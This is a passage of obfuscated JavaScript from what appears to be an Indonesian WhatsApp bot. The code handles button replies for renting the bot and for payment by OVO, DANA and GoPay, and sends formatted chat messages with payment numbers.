buttons5=[_0x589f80],btn5={'locationMessage':mhan[_0x15af3d(0x7cc,0x8c5,0x539,0x5fd)][_0x15af3d(0x681,0xb23,0x25a,0x6bb)+_0x134458(0x76e,0xb5d,0x7aa,0xa3f)],'contentText':pc_sewa(_minggu,__minggu,___minggu,_bulan,_permanen,__permanen),'footerText':_0x134458(0x784,0x65e,0x42a,0x56e)+'k\x20doang\x20ha'+_0x15af3d(0x792,0xbf4,0x875,0x367)+_0x15af3d(0xa40,0x5f7,0x95c,0xd12)+enter+enter+botname+_0x134458(0x8de,0x703,0x98d,0x578)+ownername,'buttons':buttons5,'headerType':0x6};alpha[_0x134458(0x982,0x9b7,0x8b9,0xc0a)+'e'](from,btn5,MessageType[_0x15af3d(0x2a4,0x75d,0x475,0x320)+'sage'],{});}if(subscribezeeoneofc==_0x15af3d(0xb03,0xc6e,0xd57,0xec1)){console[_0x134458(0xa47,0xd09,0xa1a,0x5de)](_0x15af3d(0x2dc,-0x15e,0x11c,-0x214)+_0x15af3d(0x6e6,0x9c2,0x7d8,0xb32),'[\x1b[1;32m\x20C'+_0x134458(0x3fe,-0x6a,0x488,0x1d3)+']',wib,color('List\x20Messa'+_0x15af3d(0x968,0x844,0x92f,0xdf1)));var sewa_1='Hai\x20@'+sender[_0x15af3d(0x53f,0x3cb,0x314,0x4ce)]('@')[0x122*-0x11+-0x1df*-0x1+-0x1*-0x1163]+(_0x134458(0x859,0x88f,0x3e9,0x667)+'ang\x20masuk\x20'+_0x15af3d(0x92b,0xd3e,0x7fb,0xd34)+_0x134458(0x6f7,0xa60,0x703,0x6d5)+',\x20metode\x20y'+_0x134458(0x5c6,0x95a,0x4f7,0x60d)+_0x15af3d(0xad3,0x766,0x9f3,0xb7a)+_0x134458(0xa8f,0x7dd,0xafc,0xe23)+_0x15af3d(0x502,0x5e6,0x2a3,0x945)+_0x15af3d(0x320,0x492,0x110,0x75c)+_0x15af3d(0x7c1,0x8f0,0xc3d,0x90c)+_0x134458(0x248,0xc3,0x1d9,0x3aa)+_0x134458(0x760,0x5e6,0x66d,0x9a1)+_0x15af3d(0x8b6,0x941,0x9cc,0x633));const _0x3bbb56={};_0x3bbb56[_0x15af3d(0x6ec,0xb96,0x4b7,0x9e8)+'t']=_0x134458(0x49a,0x5f4,0x2e2,0x716);const _0x214838={};_0x214838[_0x15af3d(0xc33,0xed4,0xf30,0xa7f)]=_0x134458(0x4d0,0x332,0x84d,0x670),_0x214838[_0x134458(0x454,0xbe,0x9,0x949)]=_0x3bbb56,_0x214838[_0x134458(0x8ff,0x4dc,0x8ef,0x610)]=0x1;const _0xd2b1e5={};_0xd2b1e5['displayTex'+'t']=_0x134458(0xa94,0xaef,0xc5e,0x991);const _0x2673b3={};_0x2673b3[_0x134458(0xae0,0xab1,0xba4,0x5f2)]=_0x15af3d(0xc57,0xa78,0xdec,0xf00)+'1',_0x2673b3['buttonText']=_0xd2b1e5,_0x2673b3[_0x134458(0x8ff,0x8db,0x547,0xc1a)]=0x1;const _0x2bb685={};_0x2bb685[_0x134458(0x599,0x8b5,0x943,0xa39)+'t']=_0x15af3d(0xa5c,0xf1b,0xa55,0x9d8);const _0x1d9d86={};_0x1d9d86[_0x134458(0xae0,0x622,0x88a,0xfce)]=_0x134458(0x6bf,0x434,0x869,0x990)+'y1',_0x1d9d86[_0x134458(0x454,0x56e,0x2a3,0x338)]=_0x2bb685,_0x1d9d86[_0x15af3d(0xa52,0x9ff,0x707,0x944)]=0x1;const buttons4=[_0x214838,_0x2673b3,_0x1d9d86],_0x32aa99={};_0x32aa99[_0x15af3d(0x94a,0x7c5,0x9b7,0x6de)+'t']=sewa_1,_0x32aa99[_0x134458(0x9b2,0x9fd,0x5d1,0x95c)]=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0x32aa99['buttons']=buttons4,_0x32aa99['headerType']=0x1;const btn4=_0x32aa99,_0x2b4f67={};_0x2b4f67[_0x15af3d(0xb6e,0xf7e,0x97a,0xb7d)]='hi',_0x2b4f67[_0x134458(0x79e,0x65b,0xb42,0xb2a)+_0x15af3d(0xc04,0x803,0xe83,0x1037)]=0x3b9aca00,_0x2b4f67[_0x15af3d(0x588,0x244,0xa07,0x803)+'d']=!![],_0x2b4f67[_0x134458(0x4d7,0xfb,0x215,0x5d1)+_0x15af3d(0x5ca,0x35c,0xa3c,0x5aa)]=!![],_0x2b4f67[_0x134458(0x403,0x336,-0xaf,-0xee)+'id']=[sender];const _0x17372e={};_0x17372e[_0x15af3d(0x540,0x79e,0x12f,0x3a8)]=_0x15af3d(0x63d,0x7be,0x35f,0xacb)+'21',_0x17372e[_0x15af3d(0xabb,0xfa0,0xd69,0x71a)+'o']=_0x2b4f67,_0x17372e['quoted']=fkontak,_0x17372e[_0x134458(0x4d7,0x8eb,0x668,0x5a0)+_0x15af3d(0x5ca,0x849,0x7a4,0x1f4)]=!![],alpha[_0x15af3d(0xad5,0xc66,0x5eb,0xac8)+'e'](from,btn4,MessageType[_0x134458(0x151,-0x337,0x197,0x2b0)+_0x134458(0x9a3,0x72c,0xc0c,0xa32)],_0x17372e);}if(subscribezeeoneofc=='bayar_ovo1'){console[_0x134458(0xa47,0xc09,0xd19,0x987)]('\x1b[1;31m~\x1b['+_0x15af3d(0x6e6,0x9d1,0x26e,0x337),_0x15af3d(0x61b,0x20f,0x54a,0x139)+_0x15af3d(0x551,0x980,0x75b,0x7aa)+']',wib,color('Button\x20Mes'+_0x134458(0x3bc,0x30a,-0x25,0x313)+'nt\x20Ovo'));var ini_info=_0x15af3d(0x56d,0x5bd,0x7e3,0x47a)+sender['split']('@')[0x1030+-0x17*-0x43+-0x1635]+(_0x15af3d(0x7d3,0x851,0x8da,0x3d4)+_0x15af3d(0xaae,0xb31,0x73b,0x64c)+_0x134458(0x234,-0x283,0x224,-0x91)+_0x134458(0xa37,0xbbc,0xb0d,0xae3)+_0x15af3d(0x997,0x5a7,0xdac,0xa52));const _0x5d4cde={};_0x5d4cde[_0x134458(0x599,0x64b,0x5e5,0x3f1)+'t']=_0x15af3d(0x463,0x579,0x679,0xa6);const _0x321d4c={};_0x321d4c['buttonId']='langsung_o'+_0x134458(0x38e,0x50c,0x29a,-0x103),_0x321d4c[_0x134458(0x454,0x37c,0x58d,0x50d)]=_0x5d4cde,_0x321d4c[_0x15af3d(0xa52,0xb66,0x961,0xed5)]=0x1;const _0x1cc026={};_0x1cc026[_0x134458(0x599,0x8de,0x1ab,0x9a3)+'t']=_0x134458(0xa73,0x5ad,0xf04,0xe6c);const _0x4c56fa={};_0x4c56fa['buttonId']=_0x134458(0xa58,0xa59,0x9d7,0x5a9),_0x4c56fa[_0x134458(0x454,0x7f4,0x640,0x7e8)]=_0x1cc026,_0x4c56fa[_0x15af3d(0xa52,0x875,0xbc1,0x957)]=0x1;const buttons6=[_0x321d4c,_0x4c56fa],_0x2d8331={};_0x2d8331['contentTex'+'t']=ini_info,_0x2d8331['footerText']=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0x2d8331[_0x15af3d(0x474,0x5d1,0xbb,0x316)]=buttons6,_0x2d8331['headerType']=0x1;const btn6=_0x2d8331,_0xf6ae6c={};_0xf6ae6c[_0x15af3d(0xb6e,0xc92,0xbee,0x679)]='hi',_0xf6ae6c[_0x134458(0x79e,0x6a4,0x3ce,0x707)+_0x134458(0xab1,0xbbc,0x80c,0xb68)]=0x3b9aca00,_0xf6ae6c[_0x15af3d(0x588,0x8da,0x8f8,0x9f1)+'d']=!![],_0xf6ae6c[_0x134458(0x4d7,0x837,0x7b2,0x316)+_0x134458(0x477,0x80d,0x49,0x262)]=!![],_0xf6ae6c[_0x15af3d(0x556,0x86e,0x1f8,0x357)+'id']=[sender];const _0x2944c1={};_0x2944c1[_0x134458(0x3ed,0x54e,-0x13,0x3b9)]=_0x15af3d(0x63d,0xab8,0x6bc,0x45a)+'21',_0x2944c1[_0x15af3d(0xabb,0x7cb,0xa5e,0x775)+'o']=_0xf6ae6c,_0x2944c1[_0x15af3d(0xc2e,0xd54,0x7cf,0x851)]=fkontak,_0x2944c1[_0x15af3d(0x62a,0x63b,0x6c1,0x15e)+_0x15af3d(0x5ca,0x20e,0x131,0xaa9)]=!![],alpha[_0x15af3d(0xad5,0xea4,0xa71,0x9ba)+'e'](from,btn6,MessageType[_0x134458(0x151,0x156,0x57e,0x4c6)+_0x15af3d(0xaf6,0x986,0x90e,0xd33)],_0x2944c1);}if(subscribezeeoneofc==_0x134458(0xb04,0xc54,0xc03,0xbe8)+'1'){console[_0x134458(0xa47,0x8a9,0xeac,0xc5c)](_0x134458(0x189,0x572,0x120,0x58)+'1;37m>',_0x15af3d(0x61b,0x657,0x72e,0x7d4)+_0x15af3d(0x551,0x54b,0x335,0x351)+']',wib,color(_0x134458(0x8d8,0xc09,0xc93,0x78e)+_0x15af3d(0x50f,0x46b,0x844,0x5f6)+_0x134458(0x1df,-0x1a9,0x339,-0xaf)));var ini_info='Hay\x20@'+sender[_0x15af3d(0x53f,0x52a,0x2a2,0x5db)]('@')[-0xad9*0x3+0x1*-0x2a5+0x1198*0x2]+(',\x20kamu\x20mau'+_0x15af3d(0xaae,0x84d,0x6c1,0xdd3)+_0x15af3d(0x387,0x182,0x10c,0x70)+_0x134458(0xa37,0x549,0xae4,0x6a9)+'e\x20qr\x20code?');const _0x4f0b87={};_0x4f0b87[_0x15af3d(0x6ec,0x9a7,0x90b,0x203)+'t']=_0x15af3d(0x463,0x835,-0x8,0x7b2);const _0x2a0821={};_0x2a0821[_0x134458(0xae0,0xf7e,0x62f,0xd8f)]=_0x15af3d(0x382,0x6ab,0x53a,0x723)+_0x134458(0x6a8,0xaeb,0x739,0x2d4),_0x2a0821['buttonText']=_0x4f0b87,_0x2a0821[_0x15af3d(0xa52,0x57e,0xcf4,0xb31)]=0x1;const _0x4aa601={};_0x4aa601['displayTex'+'t']=_0x15af3d(0xbc6,0xbfa,0xd85,0xf25);const _0x4d88e9={};_0x4d88e9[_0x15af3d(0xc33,0x7af,0x744,0xd0b)]=_0x134458(0x954,0xac7,0x5d8,0x4ce),_0x4d88e9[_0x15af3d(0x5a7,0x4e0,0x26c,0x765)]=_0x4aa601,_0x4d88e9[_0x15af3d(0xa52,0xde8,0xbc5,0x848)]=0x1;const buttons6=[_0x2a0821,_0x4d88e9],_0x5aeb0f={};_0x5aeb0f['contentTex'+'t']=ini_info,_0x5aeb0f[_0x15af3d(0xb05,0xb3d,0xd8c,0x625)]=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0x5aeb0f[_0x15af3d(0x474,0x5ec,0x93b,0x7a7)]=buttons6,_0x5aeb0f[_0x134458(0x43c,0x498,0x5ec,0x7c)]=0x1;const btn6=_0x5aeb0f,_0x102877={};_0x102877['text']='hi',_0x102877['forwarding'+_0x134458(0xab1,0xf3d,0xf35,0x917)]=0x3b9aca00,_0x102877[_0x15af3d(0x588,0x17e,0x54e,0x16c)+'d']=!![],_0x102877[_0x134458(0x4d7,0x7ce,0x23e,0x434)+_0x134458(0x477,0x21,0x433,0x64f)]=!![],_0x102877[_0x15af3d(0x556,0xa2,0x3ac,0x95a)+'id']=[sender];const _0x3a4192={};_0x3a4192['caption']=_0x134458(0x4ea,0x5a,0x337,0x24d)+'21',_0x3a4192[_0x134458(0x968,0x91f,0x738,0xbc8)+'o']=_0x102877,_0x3a4192[_0x15af3d(0xc2e,0xc05,0xf1b,0xa7d)]=fkontak,_0x3a4192['sendEpheme'+_0x134458(0x477,0x209,0x5ee,-0x15)]=!![],alpha[_0x15af3d(0xad5,0x9aa,0xe3a,0x868)+'e'](from,btn6,MessageType[_0x15af3d(0x2a4,0x681,-0x162,0x556)+_0x15af3d(0xaf6,0xb4b,0x985,0xbeb)],_0x3a4192);}if(subscribezeeoneofc==_0x15af3d(0x812,0xa03,0x7fe,0x982)+'y1'){console[_0x15af3d(0xb9a,0x86f,0xb83,0xefd)](_0x15af3d(0x2dc,0x2b8,0x2be,-0x68)+_0x134458(0x593,0x9da,0x33c,0x6a2),_0x15af3d(0x61b,0x1fc,0x8cb,0x9fc)+'MD\x20\x1b[1;37m'+']',wib,color('Button\x20Mes'+'sage\x20Payme'+_0x134458(0x78c,0x7d2,0x4e3,0xbdf)));var ini_info=_0x134458(0x41a,0xb9,0x3a6,0x505)+sender[_0x134458(0x3ec,-0x43,0x7f6,0x32b)]('@')[0xa*-0x11b+0x11a*0x16+-0xd2e]+(_0x15af3d(0x7d3,0x784,0xb8d,0xadf)+_0x134458(0x95b,0x751,0x482,0xbfc)+'e\x20nomor\x20aj'+'a\x20atau\x20pak'+_0x15af3d(0x997,0xdff,0x4f0,0xe01));const _0x2118fd={};_0x2118fd[_0x15af3d(0x6ec,0x313,0x347,0x6d2)+'t']=_0x134458(0x310,-0xc1,0xcd,0x322);const _0xcd3d3={};_0xcd3d3[_0x134458(0xae0,0x63b,0xac6,0xf6b)]=_0x134458(0x3d3,0x862,0x2f7,0x4ca)+_0x15af3d(0xbe4,0xd82,0xfef,0xc74),_0xcd3d3['buttonText']=_0x2118fd,_0xcd3d3[_0x15af3d(0xa52,0x923,0x57b,0x63d)]=0x1;const _0x10ecea={};_0x10ecea['displayTex'+'t']=_0x15af3d(0xbc6,0x8fe,0xeca,0x1031);const _0x18116f={};_0x18116f[_0x15af3d(0xc33,0xe32,0xa13,0xe74)]=_0x134458(0x197,0x214,0x2c7,0x2be),_0x18116f[_0x15af3d(0x5a7,0x470,0x517,0x2b7)]=_0x10ecea,_0x18116f[_0x15af3d(0xa52,0xc65,0xd83,0x5c5)]=0x1;const buttons6=[_0xcd3d3,_0x18116f],_0x43a3aa={};_0x43a3aa[_0x134458(0x7f7,0xbe4,0xce8,0x96d)+'t']=ini_info,_0x43a3aa['footerText']=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0x43a3aa[_0x15af3d(0x474,0x653,0x9e,0x4ef)]=buttons6,_0x43a3aa[_0x15af3d(0x58f,0x994,0xeb,0x4bd)]=0x1;const btn6=_0x43a3aa,_0x53bb0b={};_0x53bb0b['text']='hi',_0x53bb0b[_0x15af3d(0x8f1,0x612,0x4d1,0x8b1)+'Score']=0x3b9aca00,_0x53bb0b[_0x15af3d(0x588,0x48b,0x2be,0x7c1)+'d']=!![],_0x53bb0b[_0x134458(0x4d7,0x914,0x8af,0x6cc)+_0x15af3d(0x5ca,0x48e,0x306,0x905)]=!![],_0x53bb0b['mentionedJ'+'id']=[sender];const _0x3d88c9={};_0x3d88c9['caption']=_0x134458(0x4ea,0x163,0x16,0x253)+'21',_0x3d88c9[_0x134458(0x968,0xca2,0xd3c,0xb8b)+'o']=_0x53bb0b,_0x3d88c9['quoted']=fkontak,_0x3d88c9['sendEpheme'+_0x134458(0x477,0x301,0x67a,-0x2b)]=!![],alpha[_0x134458(0x982,0xba2,0x803,0xd67)+'e'](from,btn6,MessageType['buttonsMes'+_0x134458(0x9a3,0xb41,0xafe,0xe3b)],_0x3d88c9);}if(subscribezeeoneofc==_0x15af3d(0x716,0x7b8,0x4bf,0x570)+_0x15af3d(0x4e1,0x66c,0x2cb,0x288)){console[_0x134458(0xa47,0x5e8,0x8a0,0x83d)](_0x134458(0x189,0x30a,0x14,0x4c4)+_0x134458(0x593,0x4f8,0x92b,0xa28),_0x15af3d(0x61b,0x66a,0x4c7,0x30a)+'MD\x20\x1b[1;37m'+']',wib,color('Button\x20Mes'+_0x15af3d(0xa2e,0xdbf,0x902,0xd3f)+_0x15af3d(0x8a8,0xd04,0x748,0x655))),optionsp1=petik+('JASA\x20SEWA\x20'+_0x134458(0x698,0x433,0x78c,0x4c3))+petik+(_0x15af3d(0x98f,0x93f,0x648,0x523)+_0x134458(0x2c1,0x64a,0x206,0x67b))+pushname+(_0x15af3d(0xa1b,0xc42,0xa87,0xa91)+_0x134458(0x2e2,-0x187,-0xeb,0x52f))+sender[_0x134458(0x3ec,0x509,0x66,0x8d4)]('@')[-0x3b1+-0x166d+0x1a1e*0x1]+_0x15af3d(0xbe5,0xb08,0x109b,0xf30)+petik+('PAYMENT\x20OV'+'O')+petik+'\x0a\x0a'+nomor_ovo+('\x0a\x0a_Powered'+_0x134458(0x40a,0x7a,0x4e6,0x2b2))+ini_mark['split']('@')[-0x3*-0x19a+0x1*0x551+-0xa1f]+'_';const _0x45eea7={};_0x45eea7['mentionedJ'+'id']=[sender,ini_mark],_0x45eea7[_0x134458(0x79e,0x379,0x6c6,0x7b7)+'Score']=0x3e7,_0x45eea7[_0x134458(0x435,-0x8c,0x655,0x489)+'d']=!![];const _0x4fa129={};_0x4fa129[_0x15af3d(0xc2e,0x938,0xbd4,0xb3a)]=fkontak,_0x4fa129[_0x15af3d(0xabb,0x763,0xd8c,0x97e)+'o']=_0x45eea7,_0x4fa129['sendEpheme'+_0x134458(0x477,0x54e,0x563,0x119)]=!![],alpha[_0x134458(0x982,0x4ab,0x591,0x9e2)+'e'](from,optionsp1,text,_0x4fa129);}if(subscribezeeoneofc==_0x15af3d(0x382,0x1ba,-0xec,0x6ba)+_0x134458(0x6a8,0x63b,0x37c,0x265)){console[_0x134458(0xa47,0xa7a,0x5d4,0xe97)]('\x1b[1;31m~\x1b['+_0x15af3d(0x6e6,0x4b3,0xbd2,0x80a),_0x134458(0x4c8,0x8b4,0x87,0x7b6)+'MD\x20\x1b[1;37m'+']',wib,color('Button\x20Mes'+_0x134458(0x8db,0xd5f,0xc57,0xa66)+_0x134458(0x5a3,0x654,0x50b,0x185))),optionsp1=petik+(_0x134458(0x966,0x90d,0xc98,0xc3d)+'BOT')+petik+('\x0a\x0a•>\x20Nama\x20'+':\x20_')+pushname+('_\x0a•>\x20Nomor'+'\x20:\x20_@')+sender[_0x134458(0x3ec,0x8b8,0x571,0x65)]('@')[0xc4e+0x18e+-0xddc]+_0x15af3d(0xbe5,0xab5,0x75a,0xb95)+petik+(_0x134458(0x81f,0x5bc,0xc72,0x428)+'NA')+petik+'\x0a\x0a'+nomor_dana+(_0x15af3d(0xbea,0xfe0,0xf73,0x107e)+_0x15af3d(0x55d,0x18d,0x2bd,0x9e4))+ini_mark['split']('@')[-0x246e+-0xa9*0x1+-0xc5d*-0x3]+'_';const _0xe2ee32={};_0xe2ee32[_0x134458(0x403,0x146,0x677,0x162)+'id']=[sender,ini_mark],_0xe2ee32[_0x134458(0x79e,0x3dc,0x6e9,0x81d)+_0x15af3d(0xc04,0xf90,0xc40,0x818)]=0x3e7,_0xe2ee32[_0x134458(0x435,0x811,0x647,0x19a)+'d']=!![];const _0x4f6e46={};_0x4f6e46[_0x15af3d(0xc2e,0xd9a,0xb01,0xf90)]=fkontak,_0x4f6e46[_0x15af3d(0xabb,0xcbd,0xa3e,0xd25)+'o']=_0xe2ee32,_0x4f6e46[_0x15af3d(0x62a,0x1cb,0x3e1,0x83c)+'ral']=!![],alpha[_0x134458(0x982,0x78e,0xbda,0x745)+'e'](from,optionsp1,text,_0x4f6e46);}if(subscribezeeoneofc==_0x15af3d(0x526,0x4bd,0xca,0x106)+_0x134458(0xa91,0xd3a,0xc16,0x9c2)){console[_0x134458(0xa47,0xd2b,0xb7e,0xea3)](_0x15af3d(0x2dc,0x62c,0x96,0x4f9)+_0x134458(0x593,0xfb,0x9a1,0x9ed),_0x15af3d(0x61b,0x47c,0x2a4,0x296)+_0x15af3d(0x551,0x38b,0x847,0x875)+']',wib,color(_0x134458(0x8d8,0x933,0xae2,0xba1)+_0x15af3d(0xa2e,0x8ff,0xad0,0x548)+_0x15af3d(0x54b,0x214,0xdd,0x2ae))),optionsp1=petik+(_0x134458(0x966,0xd88,0xc44,0xb08)+_0x134458(0x698,0x6cc,0x3bf,0xb87))+petik+('\x0a\x0a•>\x20Nama\x20'+_0x134458(0x2c1,0xc7,0x598,0x31c))+pushname+('_\x0a•>\x20Nomor'+_0x15af3d(0x435,0x7f4,0x47f,0x2ff))+sender[_0x15af3d(0x53f,0x8d0,0x54e,0x217)]('@')[0x3e6+-0x55*-0x55+-0xab5*0x3]+_0x134458(0xa92,0x6b0,0xde6,0x5bb)+petik+('PAYMENT\x20GO'+_0x134458(0x221,0x605,0x2a3,-0x2a8))+petik+'\x0a\x0a'+nomor_gopay+(_0x15af3d(0xbea,0x9b1,0xe7f,0xe35)+'\x20by\x20@')+ini_mark['split']('@')[-0x1f01+0x11ea+0xd17]+'_';const _0x3d1212={};_0x3d1212[_0x134458(0x403,0x455,0x282,0x97)+'id']=[sender,ini_mark],_0x3d1212['forwarding'+_0x134458(0xab1,0xcc5,0xe0d,0xd0c)]=0x3e7,_0x3d1212[_0x134458(0x435,0x78c,0x71e,0x591)+'d']=!![];const _0x800f42={};_0x800f42['quoted']=fkontak,_0x800f42[_0x134458(0x968,0x74d,0x936,0x821)+'o']=_0x3d1212,_0x800f42[_0x15af3d(0x62a,0x83a,0x1d8,0x968)+_0x15af3d(0x5ca,0x94c,0xa3d,0xa9e)]=!![],alpha['sendMessag'+'e'](from,optionsp1,text,_0x800f42);}if(subscribezeeoneofc==_0x15af3d(0x900,0x9eb,0x905,0x82b)){var ini_info=_0x15af3d(0x56d,0x151,0xa3a,0x400)+sender[_0x15af3d(0x53f,0xed,0x928,0x6ad)]('@')[0x144e+-0x230a+-0x29*-0x5c]+(_0x15af3d(0x7d3,0x8e9,0x978,0x468)+_0x134458(0x4c4,0x906,0x8a7,0x166)+'a\x20apa\x20nih?'+_0x134458(0x9e4,0x640,0x5c3,0x7a6)+_0x15af3d(0x7b9,0x2fc,0x503,0x5b3)+'PAY.\x20Untuk'+_0x15af3d(0x617,0x75b,0x4e1,0x60f)+_0x134458(0x450,0x528,0x894,0x2aa)+_0x134458(0x47d,0x66d,0x83d,0x8c4)+_0x15af3d(0x449,0x675,0x8d0,0x64f)+_0x15af3d(0xb78,0xc16,0x762,0x1065));const _0x144a79={};_0x144a79[_0x134458(0x599,0x406,0xa03,0x1ce)+'t']=_0x15af3d(0x476,0x3aa,-0x2c,0x789);const _0x2701d6={};_0x2701d6[_0x134458(0xae0,0xda0,0x662,0xab5)]=_0x15af3d(0x623,0x9e1,0xa4a,0x9af)+'8',_0x2701d6['buttonText']=_0x144a79,_0x2701d6[_0x15af3d(0xa52,0x772,0xd46,0x873)]=0x1;const _0xc8b7ac={};_0xc8b7ac[_0x15af3d(0x6ec,0x759,0x4b2,0x920)+'t']='DANA';const _0xf56092={};_0xf56092[_0x15af3d(0xc33,0xd6f,0x10ed,0xffb)]=_0x15af3d(0xc57,0xf30,0xffc,0xbbc)+'18',_0xf56092[_0x15af3d(0x5a7,0x439,0x582,0x40c)]=_0xc8b7ac,_0xf56092[_0x15af3d(0xa52,0x63f,0xab7,0xf16)]=0x1;const _0x17db61={};_0x17db61[_0x134458(0x599,0x1d7,0x8f9,0x188)+'t']=_0x134458(0x73d,0x3e9,0xacd,0x8e7);const _0x4e3ae6={};_0x4e3ae6['buttonId']=_0x15af3d(0x812,0x993,0x876,0x64c)+_0x134458(0xa68,0x97c,0x87e,0xdf9),_0x4e3ae6[_0x134458(0x454,0x2c,0xe7,0x5fe)]=_0x17db61,_0x4e3ae6[_0x134458(0x8ff,0x68c,0x7a8,0xc64)]=0x1;const buttons3=[_0x2701d6,_0xf56092,_0x4e3ae6],_0xbbba44={};_0xbbba44['contentTex'+'t']=ini_info,_0xbbba44[_0x15af3d(0xb05,0xdde,0xfa4,0xa59)]=''+tampilTanggal+enter+tampilWaktu+enter+enter+'©\x20'+creator,_0xbbba44[_0x15af3d(0x474,0x2f8,0x6ee,0x319)]=buttons3,_0xbbba44[_0x134458(0x43c,0x4b3,0x38a,0x568)]=0x1;const btn3=_0xbbba44,_0x26b02c={};_0x26b02c[_0x134458(0xa1b,0x64c,0x936,0x7df)]='hi',_0x26b02c['forwarding'+_0x15af3d(0xc04,0x94f,0xceb,0x73b)]=0x3b9aca00,_0x26b02c[_0x134458(0x435,0x240,0x1c,0x679)+'d']=!![],_0x26b02c['sendEpheme'+'ral']=!![],_0x26b02c[_0x134458(0x403,0x600,0x59d,0x3fd)+'id']=[sender];const _0x1a070f={};_0x1a070f[_0x134458(0x3ed,-0x78,0x399,0x72d)]=_0x134458(0x4ea,0x5c5,0x5a3,0x689)+'21',_0x1a070f[_0x15af3d(0xabb,0xca3,0x96c,0xbbf)+'o']=_0x26b02c,_0x1a070f[_0x134458(0xadb,0xb93,0xa20,0x6a7)]=ftroli,_0x1a070f['sendEpheme'+_0x134458(0x477,0x61,0x8e8,0x8e0)]=!![],alpha[_0x15af3d(0xad5,0xcfa,0x90c,0x668)+'e'](from,btn3,MessageType['buttonsMes'+_0x15af3d(0xaf6,0x965,0xfad,0xa80)],_0x1a070f);}if(subscribezeeoneofc==_0x15af3d(0x623,0xa4e,0x786,0x90b)+'8'){var ini_info=_0x134458(0x41a,0x624,0x8da,0x663)+sender[_0x134458(0x3ec,0x4ff,0x4cb,0x1f4)]('@')[-0xeed+0x4*-0x663+0x2879]+(_0x134458(0x680,0x668,0x22f,0x73c)+_0x15af3d(0xaae,0xa0d,0xb94,0xd04)+'e\x20nomor\x20aj'+_0x134458(0xa37,0xcf4,0xe9b,0x9ea)+'e\x20qr\x20code?');const _0x4877b9={};_0x4877b9[_0x134458(0x599,0x225,0x461,0x22d)+'t']=_0x134458(0x8c3,0x96b,0xbcc,0xbe2);const _0x2380a4={};_0x2380a4[_0x15af3d(0xc33,0xec0,0xb0b,0x872)]=_0x15af3d(0x716,0x6ea,0xa62,0x4fb)+_0x15af3d(0xa04,0x6ea,0xab3,0x89c),_0x2380a4[_0x15af3d(0x5a7,0x655,0x7d7,0x18a)]=_0x4877b9,_0x2380a4[_0x134458(0x8ff,0x5d1,0xa19,0x703)]=0x1;const _0x5c06ab={};_0x5c06ab[_0x15af3d(0x6ec,0x3a4,0x406,0x474)+'t']=_0x134458(0x714,0xa5d,0xa69,0x80e);const _0x44158e={};_0x44158e[_0x134458(0xae0,0x934,0xb13,0x857)]=_0x15af3d(0xa7f,0x5d9,0xc80,0xd03),_0x44158e[_0x134458(0x454,0x54b,0x125,0x8f3)]=_0x5c06ab,_0x44158e[_0x134458(0x8ff,0x895,0x9bd,0x663)]=0x1;const buttons4=[_0x2380a4,_0x44158e],_0x2b94b5={};_0x2b94b5[_0x15af3d(0x94a,0x942,0x66c,0x89f)+'t']=ini_info,_0x2b94b5[_0x134458(0x9b2,0xe84,0xe2b,0xea1)]=''+tampilTanggal+enter+tampilWaktu+enter+'©\x20'+creator,_0x2b94b5[_0x134458(0x321,0x6da,0x61c,0x63e)]=buttons4,_0x2b94b5[_0x134458(0x43c,0x251,0x1e8,0x923)]=0x1;const btn4=_0x2b94b5,_0x1687e4={};_0x1687e4['text']='hi',_0x1687e4[_0x15af3d(0x8f1,0xbbf,0x5b4,0x49d)+_0x15af3d(0xc04,0x724,0x10f4,0xa77)]=0x3b9aca00,_0x1687e4[_0x134458(0x435,0x30b,0x202,-0x6b)+'d']=!![],_0x1687e4['sendEpheme'+'ral']=!![],_0x1687e4['mentionedJ'+'id']=[sender];const _0x2c64be={};_0x2c64be[_0x15af3d(0x540,0x1bb,0x978,0x6ad)]=_0x134458(0x4ea,0x818,0x617,0x748)+'21',_0x2c64be['contextInf'+'o']=_0x1687e4,_0x2c64be[_0x15af3d(0xc2e,0xc62,0xcfb,0xc32)]=ftroli,_0x2c64be['sendEpheme'+'ral']=!![],alpha[_0x134458(0x982,0x4fc,0x63c,0xe09)+'e'](from,btn4,MessageType[_0x134458(0x151,0x458,0x567,0x443)+_0x134458(0x9a3,0xd66,0xc79,0x650)],_0x2c64be);}if(subscribezeeoneofc==_0x134458(0x5c3,0x77b,0x3a4,0x863)+_0x134458(0x8b1,0xb9a,0x99f,0x6f1)){optionsp1='“Sesungguh'+'nya\x20orang-'+_0x134458(0x62a,0x850,0x34f,0x6fd)+_0x134458(0x747,0x781,0x9db,0x295)+_0x134458(0x6d7,0x9ac,0x326,0x9df)+'i-laki\x20mau'+_0x134458(0x642,0x24a,0x3f8,0x731)+'uan\x20dan\x20me'+_0x15af3d(0x376,0x2bb,0x459,0x5a2)+_0x15af3d(0xa0d,0x942,0xa85,0x8be)+_0x134458(0x4ee,0x9bf,0x1f9,0x959)+_0x134458(0x5a7,0x843,0x8ed,0x9dd)+'k,\x20niscaya'+_0x134458(0x40e,0x1e3,0x677,0x1c9)+_0x134458(0x674,0x185,0x2d5,0x7db)+'an\x20(ganjar'+_0x15af3d(0x8d2,0xc06,0x55a,0x40f)+_0x134458(0x3f4,0x62c,0x3c5,0x6d2)+_0x134458(0x544,0x21f,0x25a,0x566)+'\x20mereka\x20pa'+_0x134458(0x56c,0x90b,0x99c,0xdb)+_0x134458(0xaff,0xd9f,0xdab,0xd8f)+_0x15af3d(0x3d7,0x256,0x73b,0x588)+_0x15af3d(0x5c7,0x8cb,0xa93,0xa98)+'\x20Nama\x20:\x20_'+pushname+(_0x15af3d(0xc45,0x75e,0xe7d,0x831)+_0x15af3d(0x32b,-0x19b,0x61e,0x5b4))+sender[_0x15af3d(0x53f,0x5fa,0xed,0x6e0)]('@')[-0x1a58+0x21b9+-0x761]+(_0x134458(0x1ac,0x121,-0x2fe,0x114)+_0x15af3d(0x886,0xc7e,0x5f1,0x4da))+nomor_ovo+(_0x15af3d(0xbea,0x70a,0x106b,0x9bc)+'\x20by\x20@')+ini_mark[_0x15af3d(0x53f,0x9fc,0x3cf,0x8b7)]('@')[0x2098+-0x53b+0x579*-0x5]+'_';const 